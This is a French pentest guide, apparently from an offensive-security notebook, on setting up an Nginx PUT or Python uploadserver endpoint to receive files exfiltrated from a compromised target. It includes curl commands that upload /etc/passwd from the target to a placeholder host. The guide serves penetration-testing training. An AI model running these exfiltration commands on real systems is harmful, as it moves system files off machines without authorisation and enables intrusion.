# Serveur HTTP pour le televersement

## Pourquoi

Recevoir des fichiers depuis une cible compromise est aussi important que d'en envoyer. Un serveur HTTP avec support du televersement (upload) permet de centraliser la reception de fichiers exfiltres. Le module Python `uploadserver` couvre les cas simples, mais pour un serveur plus robuste et configurable, Nginx avec le support de la methode PUT offre une solution durable.

## Comment ca marche

La methode HTTP PUT permet d'envoyer un fichier vers un serveur web. Cote serveur, il suffit de configurer un endpoint qui accepte cette methode et ecrit le contenu recu dans un repertoire. Cote client, un simple `curl -T` envoie le fichier.

### Pourquoi Nginx plutot qu'Apache

Nginx presente deux avantages pour ce cas d'usage :

- Sa configuration est plus simple et plus lisible.
- Il n'execute pas les fichiers uploades (contrairement a Apache qui pourrait interpreter un fichier PHP depose dans un repertoire servi). C'est un point de securite important quand on recoit des fichiers depuis une cible potentiellement compromise.

## En pratique

### Mise en place du serveur Nginx

**Creer le repertoire de reception :**

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Creer la configuration Nginx :**

Fichier `/etc/nginx/sites-available/upload.conf` :

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

**Activer le site et redemarrer Nginx :**

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
```

{% hint style="warning" %}
Si Nginx refuse de demarrer, verifier qu'aucun autre processus n'occupe le port. La configuration par defaut de Nginx ecoute sur le port 80, ce qui peut entrer en conflit avec un serveur Python.
{% endhint %}

**Diagnostiquer un conflit de port :**

```bash
ss -lnpt | grep 80
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service
```

### Envoyer un fichier avec curl

**Depuis la cible :**

```bash
curl -T /etc/passwd http://<IP_CIBLE>:9001/SecretUploadDirectory/passwd.txt
```

**Verifier la reception :**

```bash
cat /var/www/uploads/SecretUploadDirectory/passwd.txt
```

### Alternative rapide : uploadserver (Python)

Pour les situations ou Nginx est surdimensionne, le module Python `uploadserver` fait le travail en une ligne.

```bash
pip3 install uploadserver
python3 -m uploadserver 8080
```

Le serveur ecoute sur le port 8080 et accepte les uploads via POST sur `/upload`.

**Envoyer un fichier depuis la cible :**

```bash
curl -F 'files=@/etc/passwd' http://<IP_CIBLE>:8080/upload
```

## Pieges et galeres

- Le repertoire d'upload doit appartenir a l'utilisateur sous lequel Nginx tourne (`www-data` par defaut). Sans les bons droits, l'upload echoue silencieusement avec une erreur 403.
- Nginx ne liste pas le contenu des repertoires par defaut (contrairement a Apache). C'est un avantage pour la discretion, mais il faut savoir ou chercher les fichiers recus.
- Le serveur `uploadserver` Python est mono-thread. Il convient pour des transferts ponctuels, pas pour recevoir plusieurs fichiers en parallele.
- Ne pas oublier d'arreter le serveur d'upload une fois le transfert termine. Un serveur qui reste ouvert sur le reseau est une porte d'entree potentielle.

## Retour terrain

Pour les transferts ponctuels en mission, `python3 -m uploadserver` est largement suffisant. La mise en place Nginx est utile quand on a besoin d'un serveur d'upload persistant pendant la duree d'un engagement, ou quand on veut un controle plus fin (HTTPS, authentification, logs).

## Memo express

| Outil | Commande |
|---|---|
| uploadserver (demarrer) | `python3 -m uploadserver 8080` |
| Upload via curl (POST) | `curl -F 'files=@fichier' http://IP:8080/upload` |
| Upload via curl (PUT/Nginx) | `curl -T fichier http://IP:9001/Repertoire/` |
| Config Nginx | `/etc/nginx/sites-available/upload.conf` |

***
